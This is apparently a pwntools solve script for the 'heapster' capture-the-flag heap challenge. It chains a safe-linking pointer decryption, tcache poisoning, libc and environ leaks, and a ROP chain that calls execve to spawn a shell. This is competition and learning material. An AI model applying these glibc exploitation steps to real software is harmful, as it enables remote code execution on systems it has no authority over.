#!/usr/bin/env python3

from pwn import *

exe = ELF("chal_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("heapster.sstf.site", 31339)

    return r

r = conn()
sla = lambda a,b : r.sendlineafter(a, b)
sl = lambda a : r.sendline(a)
ru = lambda a : r.recvuntil(a)

ADD = 1
DELETE = 2
PRINT = 3
VALIDATION = 4

def decrypt_ptr(cipher):
    key = 0
    plain = ''

    cipher = cipher
    for i in range(6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits;
        key = plain >> 12
    #log.info(hex(key))
    #log.info(hex(plain))
    #log.info(hex(cipher))

    return plain, key


def add(index, payload, do_sla=True):
    if do_sla:
        sla(b"cmd: ", b'1')
    else:
        sl(b'1')
    sl(f'{index}')
    sl(payload)

def delete(index):
    sla(b"cmd: ", b'2')
    sl(f'{index}')

def print():
    sla(b"cmd: ", b'3')

def main():
    #the first target is 0
    add(0, "A"*0xf)
    add(1, "B"*0xf)
    add(2, "C"*0xf)
    #add(2, "C"*0xf)
    delete(0)
    #delete(1)
    delete(2)
    #gdb.attach(r)
    #add(0, "")
    print()
    ru(b'->')
    ru(b'->')
    cipher = u64(r.recv(6)+b"\x00\x00")
    plain, key = decrypt_ptr(cipher) 
    heap_start = plain-0x2a0
    log.info(f"plain_ptr: {hex(plain)}")
    log.info(f"heap base: {hex(heap_start)}")
    log.info(f"key: {hex(key)}")

    #setup the overwrite
    payload = p64(key ^ (plain-0x210))[:-1]
    add(2, payload)

    #get the poisoned ptr into the arena
    add(3, "D"*0xf)
    
    #overwrite the size metadata of the first chunck


    add(4, b'' + p64(plain+0x10))

    #give ourselves some writes
    add(5, b'fillerfiller')
    add(6, b'fillerfiller')
    add(7, b'fillerfiller')
    add(8, b'fillerfiller')
    add(9, b'fillerfiller')
    add(10, b'fillerfiller')
    add(11, b'fillerfiller')
    add(12, b'fillerfiller')
    add(13, b'fillerfiller')
    add(14, b'fillerfiller')
    add(15, b'fillerfiller')
    add(16, b'fillerfiller')

    delete(5)
    delete(6)


    delete(7)
    delete(8)
    delete(9)
    delete(10)
    delete(11)
    delete(12)
    delete(13)
    delete(14)
    delete(15)
    delete(16)


    add(4, b'' + p64(plain-0x10))
    add(17, b'' + p64(0) +p64(0x431))
    add(4, b'' + p64(heap_start+0x6e0))
    #write a fake end ptr
    add(18, b'' + p64(0) +p64(0x20921))

    add(0, b"" + p64(0)*2)
    add(4, b'' + p64(heap_start+0x6c0))
    #add(4, b'' + p64(0) +p64(21))
    add(19, b'' + p64(0) +p64(0x21))
    delete(0)

    print()
    ru(b'->')
    libc_leak = u64(r.recv(6) + b'\x00\x00')
    libc.address = libc_leak - 0x219CE0
    log.info(f"libc leaked at : {hex(libc_leak)}")
    log.info(f"libc base at : {hex(libc.address)}")

    #### UNINTENDED SOLVE
    #add(4, b'' + p64(libc.symbols["_IO_2_1_stdout_"]))
    #add(20, b'' + p64(0xfbad1800)+p64(libc.symbols["environ"]))
    #add(4, b'' + p64(libc.symbols["_IO_2_1_stdout_"]+0x10))
    #add(21, b'' + p64(libc.symbols["environ"])*2)
    #add(4, b'' + p64(libc.symbols["_IO_2_1_stdout_"]+0x20), do_sla=False)
    #add(22, b'' + p64(libc.symbols["environ"]) + p64(libc.symbols["environ"]+0x8),do_sla=False)
    #add(4, b'' + p64(libc.symbols["_IO_2_1_stdout_"]+0x30), do_sla=False)
    #add(23, b'' + p64(libc.symbols["environ"]+8)*2, do_sla=False)

    add(4, b'' + p64(libc.symbols["environ"]))
    environ_key = libc.symbols["environ"] >> 12
    add(20, b'/bin/sh')
#    delete(20)

    print()

    ru(b'->')
    ru(b'->')
    ru(b'->')
    ru(b'->')
    ru(b'->')

    

    #ru(b'cmd: ')
    #r.interactive()


    environ_leak = u64(r.recv(6)+b'\x00\x00')
    log.info(f"enp** located at {hex(environ_leak)}")
    plain_leak = environ_leak ^ environ_key
    log.info(f"enp** located at {hex(plain_leak)}")
    ##ru(b'cmd: ')

    rip_overwrite = plain_leak - 0x128
    pop_rdi = libc.address + 0x000000000002a3e5#: pop rdi; ret;
    one_gadget = libc.address + 0xebcf8
    pop_rax = libc.address + 0x0000000000045eb0#: pop rax; ret;
    syscall = libc.address + 0x0000000000091396#: syscall; ret;
    add(4, b'' + p64(rip_overwrite))
    add(23,b'' + p64(1)+p64(pop_rdi))
    add(4, b'' + p64(rip_overwrite+0x10))
    add(24,b'' + p64(libc.symbols["environ"])+p64(pop_rax))
    add(4, b'' + p64(rip_overwrite+0x20))
    add(25,b'' + p64(0x3b)+p64(syscall))

    #gdb.attach(r)



    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
